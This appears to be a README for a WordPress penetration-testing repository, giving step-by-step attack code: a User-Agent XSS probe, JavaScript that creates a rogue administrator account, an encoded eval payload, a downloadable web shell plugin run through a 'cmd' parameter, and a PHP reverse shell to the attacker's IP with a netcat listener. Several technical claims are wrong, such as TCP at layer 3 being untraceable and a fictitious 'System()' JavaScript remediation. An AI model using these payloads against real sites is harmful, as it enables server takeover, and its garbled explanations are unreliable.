# Pentestinng WordPress Web Apps to gain a Reverse Webshell and Compromise the Server

### Privilege escalation is required to continue. WordPress Web Servers vulnerable to XSS, for example, can be indentified by sending javascript in Response Headers like this (Active Reconnaissance):
```
curl -i http://[root URL] --user-agent "<script>console.log('')</script>" //user-agent is a common vulnerable Request Header
```
Notice a 200 OK response from the server
``` 
HTTP/1.1 200 OK
Date: Wed, 29 Nov 2023 19:35:53 GMT
Server: Apache/2.4.51 (Debian)
X-Powered-By: PHP/7.4.27
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
...
```
With that being said, auth cookies can be rooted out by passing javascript executables into the site's storage:
```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php"; // change to match actual URL location of admin account registry
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=username&email=example@example.com&pass1=password&pass2password&role=administrator"; //example user creation
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
The code is then compressed to a 1-liner, encoded into javascript formatting, and printed to the console (run directly in the web console):
```
let input = 'var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=username&email=example@example.com&pass1=password&pass2password&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);'
let output = '';
for(let pos = 0; pos < input.length; pos++) {
  output += input.charCodeAt(pos) + (pos < input.length - 1 ? "," : "");
}
console.log(output)
```
The output can then be placed into a curl GET request to the site after translation, exploiting the eval() function
```
curl -i http://[root URL] --[Vulnerable Response Header] "<script>eval(String.fromCharCode([output]))</script>" // Be sure to change the bracketed variables
```

# Using the Web Shell Plugin to execute commands
### [Download the Plugin zip File](https://github.com/JacobMembrino/wordpress-plugin-exploit/raw/main/WebShell-Pentest.zip)

Upload the file to the WordPress App in the 'Plugins' menu. Install it, then Activate it. You can Reach the app like so:
```
curl http://[root URL]/WebShell-Pentest.php?cmd=ls+-la
```
Notice the 'cmd=' command in the url. This is an arbitrary bash command (url-encoded). Note: this is operating at Layer 7 (HTTP) and is traceable.

## Gaining a Full Reverse Admin Shell

Start an event listener with netcat to recieve the shell:
```
nc -lvnp 777 // Arbitrary port number
```

Send a URL-encoded php script to create a bash instance on a socket with your IP and the port number (777 in this case)
```
curl http://[root URL]/WebShell-Pentest.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22[YOUR IP]%22%2C777%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27%0A
```
The event listener will recieve the shell instance which is dead-silent and untraceable as it is established across TCP (layer 3) instead of HTTP on layer 7. 

# Remediation
Explicitly ban the System() call javascript function on all WordPress web pages.
